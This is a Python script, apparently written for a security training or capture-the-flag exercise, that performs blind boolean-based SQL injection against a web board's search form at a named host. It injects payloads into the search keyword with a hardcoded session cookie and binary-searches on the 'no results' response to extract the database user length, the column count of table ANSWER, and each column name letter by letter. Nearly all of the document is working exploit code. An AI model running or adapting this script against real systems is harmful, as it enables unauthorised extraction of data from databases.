import requests
u = "https://elms1.skinfosec.co.kr:8082/community6/free"
h = {
    "Content-Type": "application/x-www-form-urlencoded"
}
c = {
    "JSESSIONID":"02C268957006D57669C15EFD7EA86632"
}
d = {
    "startDt":"",
    "endDt":"",
    "searchType":"all",
    "keyword":"EQST%' and (공격쿼리) and '1%'='1"
}

def binarySearch(query):
    start = 1
    end  = 127
    while start < end:
        mid = int((start + end) / 2)        
        
        keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
        d["keyword"] = keyword        
        r = requests.post(url=u, headers=h, cookies=c, data=d)
        if '결과가 없습니다.' in r.text:            
            end = mid           
        else:             
            start = mid + 1
    return end

query = "select length(user) from dual"
length = binarySearch(query)

col_count=binarySearch("select count(cname) from col where tname='ANSWER'")
print(f"컬럼의 개수 : {col_count}")

for nth_col in range (1, col_count+1):
    # nth_col번째 컬럼의 이름 길이 구하기
    col_length_query=f"select length(cname) from (select cname, rownum as r from col where tname='ANSWER') where r = {nth_col}"
    col_length = binarySearch(col_length_query)
    
    print(f"{nth_col}번째 컬럼의 길이 : {col_length}")

    col_name=""
    for substr in range(1, col_length+1):
        col_name_query=f"select ascii(substr(cname, {substr}, 1)) from (select cname, rownum as r from col where tname='ANSWER') where r={nth_col}"
        col_name+=chr(binarySearch(col_name_query))
    print(col_name)

